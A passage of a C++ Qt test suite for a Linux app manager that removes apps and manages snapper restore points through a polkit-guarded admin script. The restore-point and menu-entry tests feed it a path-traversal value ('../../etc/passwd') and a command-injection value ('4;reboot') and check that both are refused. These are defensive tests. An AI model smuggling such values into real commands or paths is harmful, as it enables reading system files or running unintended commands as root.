    void anAppIsRemovedAfterAYes()
    {
        QCOMPARE(AppInstall::withoutRemoveWords(QStringLiteral("Please uninstall the MaiN Keyboard app")),
                 QStringLiteral("MaiN Keyboard"));
        // The polite words around the name go.
        QCOMPARE(AppInstall::withoutRemoveWords(QStringLiteral("Can you uninstall MaiN keyboard for me?")),
                 QStringLiteral("MaiN keyboard"));
        QCOMPARE(AppInstall::withoutRemoveWords(QStringLiteral("Could you just remove VLC from my laptop now, thanks")),
                 QStringLiteral("VLC"));
        QVERIFY(AppInstall::asksToRemove(QStringLiteral("uninstall MaiN keyboard")));
        QVERIFY(!AppInstall::asksToRemove(QStringLiteral("a pdf editor")));
        QVERIFY(AppInstall::keptBySystem(QStringLiteral("linux-cachyos")));
        QVERIFY(AppInstall::keptBySystem(QStringLiteral("plasma-workspace")));
        QVERIFY(!AppInstall::keptBySystem(QStringLiteral("main-keyboard-git")));

        // An app from outside the shelf is found by its own name.
        const QList<AppInstall::App> found = AppInstall::readSearch(fixture(QStringLiteral("remove-search.txt")),
                                                                    QStringLiteral("MaiN Keyboard"));
        QVERIFY(std::any_of(found.cbegin(), found.cend(), [](const AppInstall::App &a) {
            return a.key == QLatin1String("shelf:main-keyboard-git") && a.installed;
        }));

        StandIns standIns;
        QVERIFY(standIns.add(QStringLiteral("pacman"), QStringLiteral(
            "echo \"pacman $*\"\necho 'removing main-keyboard-git...'\n")));
        QTemporaryDir logs;
        AppInstall install;
        install.setElevate({});
        install.setAdmin(adminInSource());
        install.setLogFolder(logs.path());
        install.setSearchScript(printing(QStringLiteral("remove-search.txt")));
        QString title;
        install.setWriteDown([&title](const QString &, const QString &t, const QString &, QString *) {
            title = t;
            return true;
        });
        install.search(QStringLiteral("uninstall MaiN Keyboard"));
        QVERIFY(install.removing());
        QCOMPARE(install.query(), QStringLiteral("MaiN Keyboard"));
        QTRY_COMPARE(install.stage(), QStringLiteral("results"));
        // Only what is installed, and never the system's own.
        for (const AppInstall::App &a : install.results()) {
            QVERIFY(a.installed);
            QVERIFY(!AppInstall::keptBySystem(a.package));
        }
        // Nothing is removed before the yes.
        install.remove(QStringLiteral("shelf:main-keyboard-git"));
        QTRY_COMPARE(install.stage(), QStringLiteral("confirm"));
        QVERIFY(title.isEmpty());
        install.back();
        QCOMPARE(install.stage(), QStringLiteral("results"));
        install.remove(QStringLiteral("shelf:main-keyboard-git"));
        QTRY_COMPARE(install.stage(), QStringLiteral("confirm"));
        install.confirmRemove();
        QCOMPARE(install.stage(), QStringLiteral("removing"));
        QTRY_COMPARE(install.stage(), QStringLiteral("removed"));
        QCOMPARE(title, QStringLiteral("Removed main-keyboard-git"));
        QVERIFY(install.log().contains(QStringLiteral("pacman -Rn --noconfirm --noprogressbar --color never -- main-keyboard-git")));
    }

    void yourAppsListsWhatThePersonAddedBiggestFirst()
    {
        QTemporaryDir logs;
        AppInstall install;
        install.setElevate({});
        install.setLogFolder(logs.path());
        install.setYoursScript(printing(QStringLiteral("yours-look.txt")));
        install.setWriteDown([](const QString &, const QString &, const QString &, QString *) { return true; });
        install.listYours();
        QVERIFY(install.yours());
        QVERIFY(install.removing());
        QTRY_COMPARE(install.stage(), QStringLiteral("results"));
        // Apps in the menu installed on purpose, and Flathub's; never a
        // package that came with another, one the menu hides, or what the
        // system runs on.
        QStringList keys;
        for (const AppInstall::App &a : install.results())
            keys.append(a.key);
        QCOMPARE(keys, (QStringList{QStringLiteral("flathub:com.valvesoftware.Steam"), QStringLiteral("flathub:us.zoom.Zoom"),
                                    QStringLiteral("shelf:obs-studio"), QStringLiteral("shelf:blender"),
                                    QStringLiteral("shelf:okular"), QStringLiteral("flathub:org.example.Tiny"),
                                    // Web apps and Android apps, size unknown, by name; never Android's own.
                                    QStringLiteral("android:com.whatsapp"),
                                    QStringLiteral("web:chrome-abcdefghijklmnopabcdefghijklmnop-Profile_1.desktop")}));
        QCOMPARE(install.resultList().value(7).toMap().value(QStringLiteral("sourceName")).toString(), QStringLiteral("Web app"));
        QCOMPARE(install.resultList().value(6).toMap().value(QStringLiteral("sourceName")).toString(), QStringLiteral("Android app"));
        const QVariantMap steam = install.resultList().value(0).toMap();
        QCOMPARE(steam.value(QStringLiteral("name")).toString(), QStringLiteral("Steam"));
        QCOMPARE(steam.value(QStringLiteral("size")).toString(), QStringLiteral("9.8 GB"));
        QCOMPARE(install.resultList().value(1).toMap().value(QStringLiteral("size")).toString(), QStringLiteral("1.9 GB"));
        QCOMPARE(install.resultList().value(3).toMap().value(QStringLiteral("size")).toString(), QStringLiteral("412 MB"));
        QCOMPARE(install.yoursSize(), QStringLiteral("13 GB"));
        // Each by its own icon: its launcher's, then its launcher's id and its
        // package; a Flatpak by its id.
        QCOMPARE(install.results().at(4).icons, (QStringList{QStringLiteral("okular"), QStringLiteral("org.kde.okular")}));
        QCOMPARE(install.results().at(2).icons, (QStringList{QStringLiteral("com.obsproject.Studio"), QStringLiteral("obs-studio")}));
        QCOMPARE(install.results().at(0).icons, QStringList{QStringLiteral("com.valvesoftware.Steam")});
        QCOMPARE(steam.value(QStringLiteral("icon")).toString(), QStringLiteral("image://appicon/com.valvesoftware.Steam"));
        // A yes before one goes, and back to the list without it.
        install.remove(QStringLiteral("flathub:us.zoom.Zoom"));
        QTRY_COMPARE(install.stage(), QStringLiteral("confirm"));
        QCOMPARE(install.pickedMap().value(QStringLiteral("size")).toString(), QStringLiteral("1.9 GB"));
        install.back();
        QCOMPARE(install.stage(), QStringLiteral("results"));
        QVERIFY(install.yours());
        install.remove(QStringLiteral("shelf:linux"));
        QCOMPARE(install.stage(), QStringLiteral("results"));
        // Asking for an app afterwards is Install an app again.
        install.ask();
        QVERIFY(!install.yours());
        QVERIFY(!install.removing());
    }

    void searchRemovesAnAppByItsMenuEntry()
    {
        // The app menu's entries, the person's own over the system's.
        QTemporaryDir data;
        const QString mine = data.filePath(QStringLiteral("home"));
        const QString system = data.filePath(QStringLiteral("system"));
        QVERIFY(write(system + QStringLiteral("/applications/vlc.desktop"),
                      QStringLiteral("[Desktop Entry]\nName=VLC media player\nName[de]=VLC\nExec=vlc\n")));
        QVERIFY(write(system + QStringLiteral("/applications/org.kde.plasmashell.desktop"),
                      QStringLiteral("[Desktop Entry]\nName=Plasma\n")));
        QVERIFY(write(system + QStringLiteral("/applications/org.kde.konsole.desktop"),
                      QStringLiteral("[Desktop Entry]\nName=Konsole\n")));
        QVERIFY(write(system + QStringLiteral("/applications/org.kde.ksystemlog.desktop"),
                      QStringLiteral("[Desktop Entry]\nName=KSystemLog\n")));
        QVERIFY(write(system + QStringLiteral("/applications/org.example.viewer.desktop"),
                      QStringLiteral("[Desktop Entry]\nName=Viewer\n")));
        // An entry the person edited, which no package owns.
        QVERIFY(write(mine + QStringLiteral("/applications/vlc.desktop"),
                      QStringLiteral("[Desktop Entry]\nName=My VLC\n")));
        const QByteArray oldHome = qgetenv("XDG_DATA_HOME");
        const QByteArray oldDirs = qgetenv("XDG_DATA_DIRS");
        qputenv("XDG_DATA_HOME", mine.toUtf8());
        qputenv("XDG_DATA_DIRS", (data.filePath(QStringLiteral("none")) + QLatin1Char(':') + system).toUtf8());
        const auto restore = qScopeGuard([&] {
            oldHome.isNull() ? qunsetenv("XDG_DATA_HOME") : qputenv("XDG_DATA_HOME", oldHome);
            oldDirs.isNull() ? qunsetenv("XDG_DATA_DIRS") : qputenv("XDG_DATA_DIRS", oldDirs);
        });
        StandIns standIns;
        QVERIFY(standIns.add(QStringLiteral("pacman"), QStringLiteral(
            "case \"$*\" in\n"
            "*-Qqo*/system/applications/vlc.desktop) echo vlc ;;\n"
            "*-Qqo*/system/applications/org.kde.plasmashell.desktop) echo plasma-workspace ;;\n"
            "*-Qqo*/system/applications/org.kde.konsole.desktop) echo konsole ;;\n"
            "*-Qqo*/system/applications/org.kde.ksystemlog.desktop) echo ksystemlog ;;\n"
            "*-Qqo*/system/applications/org.example.viewer.desktop) echo viewer ;;\n"
            "*-Qqo*) exit 1 ;;\n"
            "*-Qi*ksystemlog*) printf 'Name            : ksystemlog\\nGroups          : kde-applications kde-system\\nRequired By     : None\\n' ;;\n"
            "*-Qi*viewer*) printf 'Name            : viewer\\nGroups          : None\\nRequired By     : some-suite\\n' ;;\n"
            "*-Qi*) printf 'Groups          : None\\nRequired By     : None\\n' ;;\n"
            "*) echo \"pacman $*\" ;;\n"
            "esac\n")));
        QTemporaryDir logs;
        AppInstall install;
        install.setElevate({});
        install.setAdmin(adminInSource());
        install.setLogFolder(logs.path());
        install.setWriteDown([](const QString &, const QString &, const QString &, QString *) { return true; });

        // Straight to the yes, with the package that owns the entry.
        install.removeApp(QStringLiteral("vlc.desktop"));
        QVERIFY(install.removing());
        QTRY_COMPARE(install.stage(), QStringLiteral("confirm"));
        QCOMPARE(install.pickedMap().value(QStringLiteral("package")).toString(), QStringLiteral("vlc"));
        QCOMPARE(install.pickedMap().value(QStringLiteral("name")).toString(), QStringLiteral("VLC media player"));
        install.confirmRemove();
        QTRY_COMPARE(install.stage(), QStringLiteral("removed"));
        QVERIFY(install.log().contains(QStringLiteral("pacman -Rn --noconfirm --noprogressbar --color never -- vlc")));

        // What the system runs on stays, and so does what nothing owns.
        install.removeApp(QStringLiteral("org.kde.plasmashell.desktop"));
        QTRY_COMPARE(install.stage(), QStringLiteral("failed"));
        QVERIFY(install.why().contains(QStringLiteral("Plasma is part of what the system runs on")));
        // Konsole, Plasma's own apps by their group, and what another
        // package needs, all stay, before any password is asked.
        for (const char *entry : {"org.kde.konsole.desktop", "org.kde.ksystemlog.desktop", "org.example.viewer.desktop"}) {
            install.removeApp(QString::fromLatin1(entry));
            QTRY_COMPARE(install.stage(), QStringLiteral("failed"));
            QVERIFY2(install.why().contains(QStringLiteral("is part of what the system runs on")), entry);
        }
        install.removeApp(QStringLiteral("nowhere.desktop"));
        QTRY_COMPARE(install.stage(), QStringLiteral("failed"));
        QVERIFY(install.why().startsWith(QStringLiteral("No package on this computer owns")));
        // Nothing shaped otherwise is looked for.
        install.removeApp(QStringLiteral("../../etc/passwd"));
        QCOMPARE(install.stage(), QStringLiteral("asking"));
        QVERIFY(install.removing());
    }

    void webAppsBrowserIsReadByTheEntrysQuoting()
    {
        // Chromium's own line: the quote opens before the flag.
        QCOMPARE(AppInstall::webUninstall(QStringLiteral(
                     "/usr/bin/chromium \"--profile-directory=Profile 1\" --app-id=fklnhlgfamfeknafaldenkmoeccpkmmf")),
                 (QStringList{QStringLiteral("/usr/bin/chromium"), QStringLiteral("--profile-directory=Profile 1"),
                              QStringLiteral("--app-id=fklnhlgfamfeknafaldenkmoeccpkmmf")}));
        // Quoted after the flag, unquoted, and a browser path with a space.
        QCOMPARE(AppInstall::webUninstall(QStringLiteral(
                     "chromium --profile-directory=\"Profile 2\" --app-id=fklnhlgfamfeknafaldenkmoeccpkmmf %U")),
                 (QStringList{QStringLiteral("chromium"), QStringLiteral("--profile-directory=Profile 2"),
                              QStringLiteral("--app-id=fklnhlgfamfeknafaldenkmoeccpkmmf")}));
        QCOMPARE(AppInstall::webUninstall(QStringLiteral(
                     "\"/opt/My Browser/brave\" --profile-directory=Default --app-id=fklnhlgfamfeknafaldenkmoeccpkmmf")),
                 (QStringList{QStringLiteral("/opt/My Browser/brave"), QStringLiteral("--profile-directory=Default"),
                              QStringLiteral("--app-id=fklnhlgfamfeknafaldenkmoeccpkmmf")}));
        // A Flatpak browser keeps its run command, without file forwarding.
        QCOMPARE(AppInstall::webUninstall(QStringLiteral(
                     "/usr/bin/flatpak run --command=chromium org.chromium.Chromium @@u %U @@ "
                     "--profile-directory=Default --app-id=fklnhlgfamfeknafaldenkmoeccpkmmf")),
                 (QStringList{QStringLiteral("/usr/bin/flatpak"), QStringLiteral("run"), QStringLiteral("--command=chromium"),
                              QStringLiteral("org.chromium.Chromium"), QStringLiteral("--profile-directory=Default"),
                              QStringLiteral("--app-id=fklnhlgfamfeknafaldenkmoeccpkmmf")}));
        // No app id, no browser, or an open quote: nothing to run.
        QVERIFY(AppInstall::webUninstall(QStringLiteral("chromium --profile-directory=Default")).isEmpty());
        QVERIFY(AppInstall::webUninstall(QStringLiteral("--app-id=fklnhlgfamfeknafaldenkmoeccpkmmf")).isEmpty());
        QVERIFY(AppInstall::webUninstall(QStringLiteral("chromium \"--app-id=fklnhlgfamfeknafaldenkmoeccpkmmf")).isEmpty());
    }

    void webAndAndroidAppsAreRemovedByWhatInstalledThem()
    {
        QTemporaryDir data;
        const QString mine = data.filePath(QStringLiteral("home"));
        const QString web = QStringLiteral("chrome-abcdefghijklmnopabcdefghijklmnop-Profile_1.desktop");
        QVERIFY(write(mine + QStringLiteral("/applications/") + web,
                      QStringLiteral("[Desktop Entry]\nName=YouTube\n"
                                     "Exec=chromium \"--profile-directory=Profile 1\" --app-id=abcdefghijklmnopabcdefghijklmnop\n")));
        QVERIFY(write(mine + QStringLiteral("/applications/waydroid.com.whatsapp.desktop"),
                      QStringLiteral("[Desktop Entry]\nName=WhatsApp\nExec=waydroid app launch com.whatsapp\n")));
        QVERIFY(write(mine + QStringLiteral("/applications/waydroid.com.android.settings.desktop"),
                      QStringLiteral("[Desktop Entry]\nName=Settings\nExec=waydroid app launch com.android.settings\n")));
        const QByteArray oldHome = qgetenv("XDG_DATA_HOME");
        const QByteArray oldDirs = qgetenv("XDG_DATA_DIRS");
        qputenv("XDG_DATA_HOME", mine.toUtf8());
        qputenv("XDG_DATA_DIRS", data.filePath(QStringLiteral("none")).toUtf8());
        const auto restore = qScopeGuard([&] {
            oldHome.isNull() ? qunsetenv("XDG_DATA_HOME") : qputenv("XDG_DATA_HOME", oldHome);
            oldDirs.isNull() ? qunsetenv("XDG_DATA_DIRS") : qputenv("XDG_DATA_DIRS", oldDirs);
        });
        // The browser removes its own entry, as Chromium does; Waydroid
        // removes the app only while Android runs.
        const QString marks = data.path();
        StandIns standIns;
        QVERIFY(standIns.add(QStringLiteral("chromium"), QStringLiteral(
            "echo \"$*\" > '%1/browser'\nrm -f \"$XDG_DATA_HOME/applications/%2\"\n").arg(marks, web)));
        QVERIFY(standIns.add(QStringLiteral("waydroid"), QStringLiteral(
            "case \"$1 $2\" in\n"
            "'status ') [ -f '%1/running' ] && echo 'Session:\tRUNNING' || echo 'Session:\tSTOPPED' ;;\n"
            "'session start') touch '%1/running' ;;\n"
            "'session stop') rm -f '%1/running'; touch '%1/stopped' ;;\n"
            "'app list') [ -f '%1/removed' ] || echo 'packageName: com.whatsapp' ;;\n"
            "'app remove') [ -f '%1/running' ] && touch '%1/removed' ;;\n"
            "esac\n").arg(marks)));
        QTemporaryDir logs;
        AppInstall install;
        install.setElevate({});
        install.setLogFolder(logs.path());
        install.setWriteDown([](const QString &, const QString &, const QString &, QString *) { return true; });

        install.removeApp(web);
        QTRY_COMPARE(install.stage(), QStringLiteral("confirm"));
        QCOMPARE(install.pickedMap().value(QStringLiteral("source")).toString(), QStringLiteral("web"));
        QCOMPARE(install.pickedMap().value(QStringLiteral("name")).toString(), QStringLiteral("YouTube"));
        install.confirmRemove();
        QTRY_COMPARE_WITH_TIMEOUT(install.stage(), QStringLiteral("removed"), 15000);
        QFile browser(marks + QStringLiteral("/browser"));
        QVERIFY(browser.open(QIODevice::ReadOnly));
        QCOMPARE(browser.readAll().trimmed(),
                 QByteArray("--profile-directory=Profile 1 --app-id=abcdefghijklmnopabcdefghijklmnop"));

        install.removeApp(QStringLiteral("waydroid.com.whatsapp.desktop"));
        QTRY_COMPARE(install.stage(), QStringLiteral("confirm"));
        QCOMPARE(install.pickedMap().value(QStringLiteral("package")).toString(), QStringLiteral("com.whatsapp"));
        install.confirmRemove();
        QTRY_COMPARE_WITH_TIMEOUT(install.stage(), QStringLiteral("removed"), 20000);
        // Android was started for it, and stopped again after.
        QVERIFY(QFile::exists(marks + QStringLiteral("/stopped")));
        QVERIFY(!QFile::exists(mine + QStringLiteral("/applications/waydroid.com.whatsapp.desktop")));

        // Android's own apps stay.
        install.removeApp(QStringLiteral("waydroid.com.android.settings.desktop"));
        QTRY_COMPARE(install.stage(), QStringLiteral("failed"));
        QVERIFY(install.why().contains(QStringLiteral("is part of Android")));
    }

    void restorePointsSayWhatCameNext()
    {
        const RestorePoints::Look look = RestorePoints::readLook(fixture(QStringLiteral("restore-look.txt")));
        QVERIFY(look.configured);
        QCOMPARE(look.menu, QStringLiteral("limine"));
        QCOMPARE(look.keepTool, QStringLiteral("btrfs-assistant-launcher"));
        QCOMPARE(look.bootedFrom, -1);
        QVERIFY(look.homeSeparate);
        // Pairs are one point; the one after is left out, newest first.
        QCOMPARE(look.points.size(), 3);
        QCOMPARE(look.points.at(0).number, 313);
        QCOMPARE(look.points.at(0).what, QStringLiteral("Before updating the computer"));
        QCOMPARE(look.points.at(1).what, QStringLiteral("Before installing okular"));
        QCOMPARE(look.points.at(2).kind, QStringLiteral("timeline"));
        // Which are Split Rock's own, and how many the system keeps.
        QVERIFY(look.points.at(0).own);
        QVERIFY(!look.points.at(1).own);
        QVERIFY(look.cleanup);
        QCOMPARE(look.limit, 50);
        QCOMPARE(look.limitImportant, 15);

        QCOMPARE(RestorePoints::describe(QStringLiteral("pacman -Rns qt5-tools python-pip"), QStringLiteral("number")),
                 QStringLiteral("Before removing qt5-tools, python-pip"));
        QCOMPARE(RestorePoints::describe(QStringLiteral("pacman -Syu"), QStringLiteral("number")),
                 QStringLiteral("Before updating the computer"));
        QCOMPARE(RestorePoints::describe(QStringLiteral("Split Rock: Install okular"), QStringLiteral("number")),
                 QStringLiteral("Before installing okular"));
        QCOMPARE(RestorePoints::describe(QStringLiteral("Genie: Remove main-keyboard-git"), QStringLiteral("number")),
                 QStringLiteral("Before removing main-keyboard-git"));
        // A helper's long words, and the package files it built, read plainly.
        QCOMPARE(RestorePoints::describe(QStringLiteral("pacman --upgrade --color=always --noconfirm -- "
                                                        "/home/user/.cache/paru/clone/thing/thing-1-1-x86_64.pkg.tar.zst"),
                                         QStringLiteral("number")),
                 QStringLiteral("Before installing a community app"));
        QCOMPARE(RestorePoints::describe(QStringLiteral("pacman --sync --needed vlc"), QStringLiteral("number")),
                 QStringLiteral("Before installing vlc"));
        // An option's value after it, as Install an app's own job writes it,
        // is no app.
        QCOMPARE(RestorePoints::describe(QStringLiteral("pacman -S --needed --noconfirm --noprogressbar --color never -- discover"),
                                         QStringLiteral("number")),
                 QStringLiteral("Before installing discover"));
        QVERIFY(RestorePoints::isOwn(QStringLiteral("Genie: Update")));
        QVERIFY(RestorePoints::isOwn(QStringLiteral("Shuffle Core: Update")));
        QVERIFY(!RestorePoints::isOwn(QStringLiteral("pacman -Syu")));

        // Started from one: the computer runs on its snapshot.
        QString booted = fixture(QStringLiteral("restore-look.txt"));
        booted.replace(QStringLiteral("rootflags=subvol=/@"), QStringLiteral("rootflags=subvol=/@/.snapshots/313/snapshot"));
        QCOMPARE(RestorePoints::readLook(booted).bootedFrom, 313);

        // Listing needs the password where the person may not.
        QCOMPARE(RestorePoints::readLook(QStringLiteral("@@ snapper\nyes\n@@ list\nNo permissions.\n@@ end\n")).denied, true);
    }

    void goingBackSaysWhereToTap()
    {
        RestorePoints restore;
        restore.setLookScript(printing(QStringLiteral("restore-look.txt")));
        restore.check();
        QTRY_COMPARE(restore.stage(), QStringLiteral("ready"));
        restore.choose(311);
        QCOMPARE(restore.stage(), QStringLiteral("chosen"));
        const QStringList steps = restore.steps();
        QVERIFY(steps.join(QLatin1Char(' ')).contains(QStringLiteral("open Snapshots")));
        QVERIFY(steps.join(QLatin1Char(' ')).contains(QStringLiteral("number 311")));
        restore.back();
        QCOMPARE(restore.stage(), QStringLiteral("ready"));
    }

    void eachAdministratorJobHasAPromptOfItsOwn()
    {
        // pkexec picks the polkit action by the program and its first
        // argument, the job; a job without one would show the raw command
        // line, and one matching the program alone could be picked for any.
        QFile admin(QStringLiteral(PROJECT_DIR "/src/admin/split-rock-admin"));
        QVERIFY(admin.open(QIODevice::ReadOnly));
        const QString script = QString::fromUtf8(admin.readAll());
        QFile policy(QStringLiteral(PROJECT_DIR "/data/io.github.carlsonjm.splitrock.admin.policy.in"));
        QVERIFY(policy.open(QIODevice::ReadOnly));
        const QString actions = QString::fromUtf8(policy.readAll());
        // The jobs that run as the person need no prompt.
        const QStringList asPerson{QStringLiteral("unused"), QStringLiteral("kept")};
        static const QRegularExpression job(QStringLiteral(R"(^([a-z|-]+)\)$)"), QRegularExpression::MultilineOption);
        const qsizetype from = script.indexOf(QStringLiteral("case $job in"));
        QVERIFY(from > 0);
        QStringList jobs;
        for (auto it = job.globalMatch(script, from); it.hasNext();)
            jobs += it.next().captured(1).split(QLatin1Char('|'));
        QVERIFY(jobs.contains(QStringLiteral("restore-list")));
        QVERIFY(jobs.contains(QStringLiteral("appstore")));
        for (const QString &name : jobs) {
            if (asPerson.contains(name))
                continue;
            QVERIFY2(actions.contains(QStringLiteral("<action id=\"io.github.carlsonjm.splitrock.admin.%1\">").arg(name)),
                     qPrintable(name));
            QVERIFY2(actions.contains(QStringLiteral("exec.argv1\">%1</annotate>").arg(name)), qPrintable(name));
        }
        QCOMPARE(actions.count(QStringLiteral("exec.path")), actions.count(QStringLiteral("exec.argv1")));
        // Reading the restore points is the only one without the password, and
        // only in the person's own session at the computer.
        QCOMPARE(actions.count(QStringLiteral("<allow_active>yes</allow_active>")), 1);
        QCOMPARE(actions.count(QStringLiteral("<allow_any>auth_admin</allow_any>")), actions.count(QStringLiteral("<action ")));
        QCOMPARE(actions.count(QStringLiteral("<allow_inactive>auth_admin</allow_inactive>")), actions.count(QStringLiteral("<action ")));
        const qsizetype list = actions.indexOf(QStringLiteral("admin.restore-list\""));
        QVERIFY(actions.indexOf(QStringLiteral("<allow_active>yes</allow_active>")) > list);
        QVERIFY(actions.indexOf(QStringLiteral("<allow_active>yes</allow_active>")) < actions.indexOf(QStringLiteral("</action>"), list));
    }

    // Deleting restore points: each with the one taken after it, and never
    // the one the computer runs on or starts from.
    void theAdministratorDeletesOnlyRestorePointsThatMayGo()
    {
        StandIns standIns;
        const QString ran = standIns.path() + QStringLiteral("/ran");
        QVERIFY(standIns.add(QStringLiteral("snapper"), QStringLiteral(
            "case \"$*\" in\n"
            "*--csvout*) printf '%s\\n' number,type,pre-number,default,active 0,single,,no,no 4,pre,,no,no 5,post,4,no,no "
            "6,single,,no,no 7,pre,,no,no 8,post,7,yes,yes ;;\n"
            "*) echo \"snapper $*\" >> '%1' ;;\n"
            "esac\n").arg(ran)));
        const auto job = [](const QStringList &arguments) {
            QProcess p;
            p.setProcessChannelMode(QProcess::MergedChannels);
            p.start(adminInSource().first(), arguments);
            p.closeWriteChannel();
            if (!p.waitForFinished(20000))
                return -1;
            return p.exitCode();
        };
        const auto said = [&ran] {
            QFile file(ran);
            const QString text = file.open(QIODevice::ReadOnly) ? QString::fromUtf8(file.readAll()) : QString();
            file.remove();
            return text;
        };
        QCOMPARE(job({QStringLiteral("restore-delete"), QStringLiteral("4"), QStringLiteral("6")}), 0);
        QCOMPARE(said(), QStringLiteral("snapper -c root delete --sync 4 5 6\n"));
        // The pair the computer starts from, a post alone, a number not
        // there, and anything that isn't a number are refused, with nothing
        // deleted.
        for (const QStringList &refused : QList<QStringList>{{QStringLiteral("7")},
                                                              {QStringLiteral("5")},
                                                              {QStringLiteral("9")},
                                                              {QStringLiteral("4"), QStringLiteral("0")},
                                                              {QStringLiteral("4;reboot")},
                                                              {}}) {
            QCOMPARE(job(QStringList{QStringLiteral("restore-delete")} + refused), 2);
            QCOMPARE(said(), QString());
        }
    }

    void freeUpSpaceOffersOlderRestorePointsUnticked()
    {
        QTemporaryDir dir;
        const QString asked = dir.filePath(QStringLiteral("asked"));
        const QString many = QStringLiteral(FIXTURES_DIR "/chores/restore-look-many.txt");
        SpaceCleanup space;
        space.setElevate({});
        space.setAdmin(adminStandIn(QStringLiteral(
            "case $1 in\n"
            "restore-list) cat '%1' ;;\n"
            "free-space) echo \"$*\" > '%2'; echo '@@ step restores' ;;\n"
            "unused) echo '@@ orphans'; echo '@@ end' ;;\n"
            "esac\n").arg(many, asked)));
        space.setLookScript(printing(QStringLiteral("space-look-restores.txt")));
        space.setYoursScript(QStringLiteral("true"));
        space.setPersonScript(QStringLiteral("true"));
        space.setFreeScript(QStringLiteral("echo 49048576"));
        space.setWriteDown([](const QString &, const QString &, const QString &, QString *) { return true; });
        space.setReport({});
        space.check();
        QTRY_COMPARE(space.stage(), QStringLiteral("ready"));
        const QList<SpaceCleanup::Item> items = space.items();
        const auto older = std::find_if(items.cbegin(), items.cend(),
                                        [](const SpaceCleanup::Item &i) { return i.id == QLatin1String("restores"); });
        QVERIFY(older != items.cend());
        // Six restore points: the newest 3 stay, and the row starts unticked
        // with no size, since that shows only once they're gone.
        QCOMPARE(older->count, 3);
        QVERIFY(!older->chosen);
        QVERIFY(older->admin);
        QVERIFY2(older->detail.startsWith(QStringLiteral("3 of 6. The newest 3 always stay")), qPrintable(older->detail));
        const QVariantMap row = space.itemList().at(int(older - items.cbegin())).toMap();
        QCOMPARE(row.value(QStringLiteral("size")).toString(), QString());

        for (const SpaceCleanup::Item &item : items)
            space.choose(item.id, item.id == QLatin1String("restores"));
        QVERIFY(space.needsPassword());
        space.start();
        QTRY_COMPARE(space.stage(), QStringLiteral("done"));
        QFile file(asked);
        QVERIFY(file.open(QIODevice::ReadOnly));
        const QString job = QString::fromUtf8(file.readAll()).trimmed();
        QVERIFY2(job.startsWith(QStringLiteral("free-space ")) && job.endsWith(QStringLiteral(" restores --")), qPrintable(job));
        QCOMPARE(space.heldBack(), QString());
    }

    void freeingUpSpaceClearsAllButTheNewestThreeRestorePoints()
    {
        StandIns standIns;
        const QString ran = standIns.path() + QStringLiteral("/ran");
        const QString rows = standIns.path() + QStringLiteral("/rows");
        QVERIFY(standIns.add(QStringLiteral("snapper"), QStringLiteral(
            "case \"$*\" in\n"
            "*--csvout*) echo number,type,pre-number,default,active; tr ' ' '\\n' < '%2' ;;\n"
            "*) echo \"snapper $*\" >> '%1' ;;\n"
            "esac\n").arg(ran, rows)));
        const auto clears = [&](const QString &list) {
            QFile r(rows);
            if (!r.open(QIODevice::WriteOnly) || r.write(list.toUtf8()) < 0)
                return QStringLiteral("(not written)");
            r.close();
            QProcess p;
            p.setProcessChannelMode(QProcess::MergedChannels);
            p.start(adminInSource().first(),
                    {QStringLiteral("free-space"), QStringLiteral("Split Rock"), QStringLiteral("0"), QStringLiteral("restores")});
            p.closeWriteChannel();
            if (!p.waitForFinished(20000) || p.exitCode() != 0)
                return QStringLiteral("(failed) ") + QString::fromUtf8(p.readAll());
            QFile file(ran);
            const QString text = file.open(QIODevice::ReadOnly) ? QString::fromUtf8(file.readAll()) : QString();
            file.remove();
            return text;
        };
        // A pair goes whole; the newest 3 and the pair the computer starts
        // from stay.
        QCOMPARE(clears(QStringLiteral("0,single,,no,no 2,single,,no,no 3,pre,,no,no 4,post,3,no,no 6,single,,no,no "
                                       "7,pre,,no,no 8,post,7,yes,yes 9,single,,no,no 10,single,,no,no")),
                 QStringLiteral("snapper -c root delete --sync 2 3 4 6\n"));
        // An older pair the computer starts from stays, and then nothing is
        // left to clear.
        QCOMPARE(clears(QStringLiteral("0,single,,no,no 2,pre,,no,no 3,post,2,yes,yes 5,single,,no,no "
                                       "6,single,,no,no 7,single,,no,no")),
                 QString());
        // Three or fewer: nothing goes.
        QCOMPARE(clears(QStringLiteral("0,single,,no,no 5,single,,no,no 6,single,,no,no 7,single,,no,no")), QString());
    }

    void clearingOlderRestorePointsAsksFirstAndKeepsTheNewest()
    {
        QTemporaryDir dir;
        const QString look = dir.filePath(QStringLiteral("look"));
        const QString asked = dir.filePath(QStringLiteral("asked"));
        const QString free = dir.filePath(QStringLiteral("free"));
        QVERIFY(write(free, QStringLiteral("1000000\n")));
        RestorePoints restore;
        restore.setElevate({});
        restore.setLookScript(printing(QStringLiteral("restore-look.txt")));
        // Each look at the free space after a delete finds 2 GB more.
        restore.setFreeScript(QStringLiteral("cat '%1'").arg(free));
        restore.setAdmin({QStringLiteral("sh"), QStringLiteral("-c"),
                          QStringLiteral("echo \"$*\" > '%1'; echo 3097152 > '%2'").arg(asked, free), QStringLiteral("admin")});
        QStringList written;
        restore.setWriteDown([&written](const QString &id, const QString &title, const QString &undo, QString *) {
            written << id << title << undo;
            return true;
        });
        restore.check();
        QTRY_COMPARE(restore.stage(), QStringLiteral("ready"));
        // Three in the fixture: all are among the newest three.
        QCOMPARE(restore.olderCount(), 0);
        restore.askClearOlder();
        QCOMPARE(restore.stage(), QStringLiteral("ready"));

        // One chosen: Delete asks first, and Cancel goes back with nothing done.
        restore.choose(310);
        restore.askDelete();
        QCOMPARE(restore.stage(), QStringLiteral("confirmDelete"));
        QCOMPARE(restore.deletingCount(), 1);
        restore.cancelDelete();
        QCOMPARE(restore.stage(), QStringLiteral("chosen"));
        QVERIFY(!QFile::exists(asked));
        QVERIFY(written.isEmpty());

        restore.askDelete();
        restore.confirmDelete();
        QCOMPARE(restore.stage(), QStringLiteral("deleting"));
        QVERIFY(restore.busy());
        QTRY_COMPARE(restore.stage(), QStringLiteral("ready"));
        QFile said(asked);
        QVERIFY(said.open(QIODevice::ReadOnly));
        QCOMPARE(QString::fromUtf8(said.readAll()).trimmed(), QStringLiteral("restore-delete 310"));
        QCOMPARE(written.value(1), QStringLiteral("Deleted restore point 310"));
        QCOMPARE(written.value(2), QString());
        QCOMPARE(restore.points().size(), 2);
        QVERIFY2(restore.note().contains(QStringLiteral("2.0 GB came free")), qPrintable(restore.note()));
    }

    void aClosedPasswordBoxDeletesNothing()
    {
        QTemporaryDir dir;
        RestorePoints restore;
        restore.setElevate({});
        restore.setLookScript(printing(QStringLiteral("restore-look.txt")));
